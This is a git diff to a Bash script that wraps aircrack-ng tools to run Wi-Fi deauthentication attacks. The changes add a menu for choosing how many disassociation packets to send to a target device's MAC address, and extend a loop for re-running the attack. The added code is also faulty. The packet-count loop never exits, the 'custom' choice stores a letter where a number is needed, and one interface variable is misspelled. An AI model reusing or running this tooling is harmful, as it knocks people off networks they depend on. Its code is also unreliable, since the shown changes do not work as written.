@@ -51,6 +51,8 @@ custom_exit() {
 
 # Set up the custom action for Ctrl+C
 trap custom_interrupt SIGINT
+
+# Custom exit action
 trap custom_exit EXIT
 
 # Prechecks before script runs
@@ -240,6 +242,28 @@ pre_aireplay_attack() {
             esac
         done
     else
+        # put aireplay deauth packet count here selection!!!!!!!!!!!!!!!!
+        while true; do
+            echo "*********************"
+            echo "[F] A few (25)"
+            echo "[M] Many (100)"
+            echo "[C] Custom"
+            echo "*********************"
+            read -p "How many dissasociation packets do you want to send to $MAC?" choice3
+            case "$choice3" in
+                [Ff]*)
+                    packetct=25
+                    ;;
+                [Mm]*)
+                    packetct=100
+                    ;;
+                [Cc]*)
+                    packetct=$choice3
+                    ;;
+                *)
+                    echo "Invalid choice. Please enter 'f' 'm' or 'c'."
+            esac
+        done
         printf "Setting $INF to station mode.\n"
         sudo airmon-ng stop $INF > /dev/null 2>&1
         printf "Setting $INMP to monitor on channel $CHNL.\n"
@@ -260,8 +284,8 @@ start_aireplay_attack() {
         
         if echo "$aireout" | grep -q "No such BSSID available"; then
             while true; do
-                read -p "Would you like to run aireplay-ng again?[y/n(exit)]: " choice3
-                case "$choice3" in
+                read -p "Would you like to run aireplay-ng again?[y/n(exit)]: " choice4
+                case "$choice4" in
                     [Yy]*)
                         printf "Running aireplay-ng again...\n"
                         clear
@@ -292,23 +316,26 @@ start_aireplay_attack
 # Function to display the menu
 display_menu() {
     clear
-    printf "You have reached the end of this script. Select the next option:"
     echo "**********************************************"
     echo "1. Restart Script"
     echo "2. Run Aireplay Attack Again"
     echo "3. Quit"
     echo "**********************************************"
+    read -p "You have reached the end of this script. Select the next option:" choice5
 }
 
 # End menu loop
 while true; do
     display_menu
-    read -p "Please select: " choice4
-    case "$choice4" in
+    case "$choice5" in
         1)
             clear
             printf "Restarting the script...\n"
             sleep 2
+            printf "Setting $INF to station mode.\n"
+            sudo airmon-ng stop $INF > /dev/null 2>&1
+            printf "Setting $INMP to monitor mode.\n"
+            sudo airmon-ng start $ITMP > /dev/null 2>&1
             airodump_scan
             ring_filter_search
             pre_aireplay_attack
@@ -326,7 +353,7 @@ while true; do
             ;;
         *)
             clear
-            printf "Invalid choice. Please enter 1, 2, or 3.\n"
+            printf "Invalid choice. Please enter '1', '2', or '3'.\n"
             sleep 2
             ;;
     esac
